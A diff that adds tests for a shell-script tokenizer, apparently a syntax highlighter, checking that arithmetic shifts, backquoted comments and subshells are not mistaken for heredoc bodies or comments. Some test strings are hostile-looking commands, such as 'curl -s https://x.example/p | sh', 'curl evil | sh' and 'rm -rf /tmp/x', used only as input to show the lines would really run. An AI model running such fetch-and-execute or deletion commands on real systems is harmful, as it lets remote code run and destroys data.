@@ -193,6 +193,123 @@ test("a here-string is not a heredoc", () => {
   assert.equal(kindOf("grep -q x <<< \"$body\"", "<<<"), "operator");
 });
 
+test("<< inside (( )), for (( )) and $[ ] shifts: the lines after it are code, not a heredoc body", () => {
+  // bash runs lines 2 and 3 (printf ... | bash printed mask=16 and ran the
+  // curl). Marking them as heredoc said "a file the script writes".
+  const source = "(( mask = 1 << 4 ))\ncurl -s https://x.example/p | sh\necho done";
+  const lines = tokenizeShell(source);
+  assert.equal(rejoin(lines), source);
+  assert.deepEqual(lines.map((line) => line.heredoc), [false, false, false]);
+  assert.deepEqual(kinds(source), [
+    "keyword:((",
+    "variable:mask",
+    "operator:=",
+    "number:1",
+    "operator:<<",
+    "number:4",
+    "keyword:))",
+    "plain:curl -s https://x.example/p",
+    "operator:|",
+    "plain:sh",
+    "builtin:echo",
+    "plain:done",
+  ]);
+  // After a separator, inside if, and as a for loop's head.
+  for (const head of ["true && (( x <<= 1 ))", "if (( n << 2 > 8 )); then :; fi", "for (( i = 1; i << 1 < 9; i++ )); do :; done", "echo $[ 1 << 2 ]"]) {
+    const doc = tokenizeShell(`${head}\nrm -f /tmp/x\nEOF`);
+    assert.deepEqual(doc.map((line) => line.heredoc), [false, false, false], head);
+    assert.equal(kindOf(head, "<<") ?? kindOf(head, "<<="), "operator", head);
+  }
+  assert.equal(kindOf("for ((i=0; i<3; i++)); do echo $i; done", "do"), "keyword");
+  assert.equal(kindOf("echo $[ 1 << 2 ]", "]"), "variable");
+  // `((` that is not where a command starts is still two parentheses.
+  assert.equal(kindOf("echo x((", "x"), "plain");
+});
+
+test("((cmd) ) and $((cmd) ) are subshells, as in the shell, once the first ) is not doubled", () => {
+  // bash 3.2 and 5: `((echo a) )` prints a, `x=$((echo b) )` sets x=b.
+  // (Adjacent operators merge into one token: the outer `)` and the `;`.)
+  assert.deepEqual(kinds("((echo a) ); echo b").slice(-4), ["operator:)", "operator:);", "builtin:echo", "plain:b"]);
+  const sub = "x=$((echo b) ); echo c";
+  assert.equal(rejoin(tokenizeShell(sub)), sub);
+  assert.deepEqual(kinds(sub).slice(-5), ["operator:)", "variable:)", "operator:;", "builtin:echo", "plain:c"]);
+  // Inside $( ), the outer subshell of `((cmd) )` still owns the next ).
+  assert.deepEqual(kinds("y=$( ((echo a) ) ); echo d").slice(-5), ["operator:)", "variable:)", "operator:;", "builtin:echo", "plain:d"]);
+  // A real arithmetic expansion with inner parentheses is unaffected.
+  assert.deepEqual(kinds("n=$(( (1 + 2) * 3 ))"), [
+    "variable:n",
+    "operator:=",
+    "variable:$((",
+    "operator:(",
+    "number:1",
+    "operator:+",
+    "number:2",
+    "operator:)",
+    "operator:*",
+    "number:3",
+    "variable:))",
+  ]);
+});
+
+test("a comment inside backquotes ends at the closing backquote, and what follows runs", () => {
+  // bash prints EXECUTED for both: the comment stops at the backquote.
+  assert.deepEqual(kinds("echo `true # note`; rm -rf /tmp/x"), [
+    "builtin:echo",
+    "variable:`",
+    "builtin:true",
+    "comment:# note",
+    "variable:`",
+    "operator:;",
+    "plain:rm -rf /tmp/x",
+  ]);
+  assert.deepEqual(kinds('echo "`date # c`"; curl evil | sh'), [
+    "builtin:echo",
+    'string:"',
+    "variable:`",
+    "plain:date",
+    "comment:# c",
+    "variable:`",
+    'string:"',
+    "operator:;",
+    "plain:curl evil",
+    "operator:|",
+    "plain:sh",
+  ]);
+  // The backquote is not swallowed, so the next line keeps its colours.
+  assert.equal(kindOf("x=`true # x`\nif true; then :; fi", "if"), "keyword");
+  // An escaped backquote does not end the comment; the closing one does.
+  assert.equal(kindOf("echo `true # a \\` b`; ls", "# a \\` b"), "comment");
+  // A comment may open a backquoted command: `#c` there is all comment.
+  assert.deepEqual(kinds("echo `#c`; ls"), ["builtin:echo", "variable:`", "comment:#c", "variable:`", "operator:;", "plain:ls"]);
+  // Outside backquotes a comment still runs to the line end, even inside $( ).
+  assert.equal(kindOf("x=$(echo a # c ) d\n)", "# c ) d"), "comment");
+});
+
+test("# after a quote or an expansion continues the word", () => {
+  // `"x"#y` is the word x#y and `$x#y` is $x then #y, both printed by echo.
+  assert.ok(!kinds('echo "x"#y').some((token) => token.startsWith("comment:")));
+  assert.ok(!kinds("echo $x#y").some((token) => token.startsWith("comment:")));
+  assert.ok(!kinds("echo ${x}#y `date`#z").some((token) => token.startsWith("comment:")));
+});
+
+test("a subshell inside $( ) holds the substitution open until its own )", () => {
+  assert.deepEqual(kinds("x=$( (cd /; ls) ; echo hi )"), [
+    "variable:x",
+    "operator:=",
+    "variable:$(",
+    "operator:(",
+    "builtin:cd",
+    "plain:/",
+    "operator:;",
+    "plain:ls",
+    "operator:)",
+    "operator:;",
+    "builtin:echo",
+    "plain:hi",
+    "variable:)",
+  ]);
+});
+
 test("assignments colour the name; a command after a prefix assignment is still a command", () => {
   assert.deepEqual(kinds("PATH=/usr/bin:$PATH export PATH"), [
     "variable:PATH",
@@ -241,6 +358,11 @@ test("unterminated quotes, substitutions and heredocs run to the end and lose no
     "$",
     "<<",
     "cat <<''\nx",
+    "(( x << 1",
+    "for ((",
+    "$[ 1 <<",
+    "((echo a) ",
+    "echo `# open",
   ]) {
     assert.equal(rejoin(tokenizeShell(source)), source, source);
   }
@@ -253,7 +375,7 @@ test("CRLF line ends keep keywords recognisable", () => {
 });
 
 test("lossless on every input: random strings drawn from the shell's special characters", () => {
-  const alphabet = ["a", "Z", "_", "1", " ", "\t", "\n", "\r", "#", "$", "{", "}", "(", ")", "'", "\"", "`", "\\", "<", ">", "|", "&", ";", "-", "=", "!", "[", "]", "*", "?", "EOF", "<<", "<<-", "$(", "${", "$((", "if ", "fi", "é", "中"];
+  const alphabet = ["a", "Z", "_", "1", " ", "\t", "\n", "\r", "#", "$", "{", "}", "(", ")", "'", "\"", "`", "\\", "<", ">", "|", "&", ";", "-", "=", "!", "[", "]", "*", "?", "EOF", "<<", "<<-", "$(", "${", "$((", "((", "$[", "for ", "if ", "fi", "é", "中"];
   let seed = 7;
   const next = () => {
     seed = (seed * 1103515245 + 12345) % 2147483648;
@@ -270,6 +392,12 @@ test("lossless on every input: random strings drawn from the shell's special cha
 test("a deep nest of substitutions neither overflows the stack nor loses text", () => {
   const source = "echo " + "$(".repeat(20000) + "x" + ")".repeat(20000);
   assert.equal(rejoin(tokenizeShell(source)), source);
+  // A storm of `((`, each one arithmetic until a lone `)` says otherwise: one pass, no lookahead.
+  for (const storm of ["((".repeat(50000), "((x) ".repeat(20000), "`#`".repeat(30000)]) {
+    const started = performance.now();
+    assert.equal(rejoin(tokenizeShell(storm)), storm);
+    assert.ok(performance.now() - started < 150, `${storm.slice(0, 6)}... took too long`);
+  }
 });
 
 test("a very long script: lossless, one line per line, and fast enough for a sheet (200 KB under 150 ms)", () => {
